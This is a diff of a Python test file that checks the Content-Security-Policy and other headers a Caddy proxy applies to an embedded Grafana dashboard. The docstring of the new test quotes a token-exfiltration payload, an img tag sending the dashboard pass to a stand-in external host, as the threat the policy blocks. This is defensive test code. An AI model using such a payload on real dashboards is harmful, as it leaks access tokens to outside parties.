@@ -263,14 +263,40 @@ def test_grafana_proxy_headers_allow_same_origin_embedding_only():
     lines = [line.strip() for line in caddy.splitlines()]
     assert lines[1:4] == ["header {", "defer", "-X-Frame-Options"]
     headers = dict(fh.GRAFANA_PROXY_HEADERS)
-    assert headers[CSP] == "frame-ancestors 'self'"
+    assert headers[CSP] == fh.GRAFANA_CSP
     # Il lasciapassare e' nell'URL della dashboard: non deve uscire come Referer.
     assert headers["Referrer-Policy"] == "no-referrer"
     assert headers["X-Content-Type-Options"] == "nosniff"
     assert "X-Frame-Options" not in headers
     for name, value in headers.items():
         assert f'    {name} "{value}"' in caddy
-        assert "unsafe-" not in value and '"' not in value
+        assert '"' not in value
+
+
+def _directives(csp):
+    return {part.split()[0]: part.split()[1:] for part in (p.strip() for p in csp.split(";")) if part}
+
+
+def test_grafana_csp_keeps_every_load_on_the_same_origin():
+    """Un pannello Testo con ``<img src="https://esterno/?p=${pass}">`` (o uno
+    sfondo, un form, un fetch) non porta fuori il lasciapassare: nessuna
+    direttiva di caricamento ammette un'origine esterna. Grafana 13 richiede
+    script/stili inline ed eval (provato dal vivo: kiosk nell'iframe, editor
+    del pannello, impostazioni, elenco senza violazioni)."""
+    directives = _directives(fh.GRAFANA_CSP)
+    allowed = {"'self'", "'none'", "data:", "blob:", "'unsafe-inline'", "'unsafe-eval'"}
+    for name, sources in directives.items():
+        assert set(sources) <= allowed, (name, sources)
+    assert directives["default-src"] == ["'self'"]
+    assert directives["img-src"] == ["'self'", "data:", "blob:"]
+    assert directives["connect-src"] == ["'self'"]
+    assert directives["form-action"] == ["'self'"]
+    assert directives["base-uri"] == ["'self'"]
+    assert directives["object-src"] == ["'none'"]
+    assert directives["frame-ancestors"] == ["'self'"]
+    # Le sole eccezioni rispetto a Plenora: script e stili di Grafana.
+    unsafe = {name for name, sources in directives.items() if any(s.startswith("'unsafe-") for s in sources)}
+    assert unsafe == {"script-src", "style-src"}
 
 
 def test_validator_checks_the_headers_on_the_real_frontend_response():
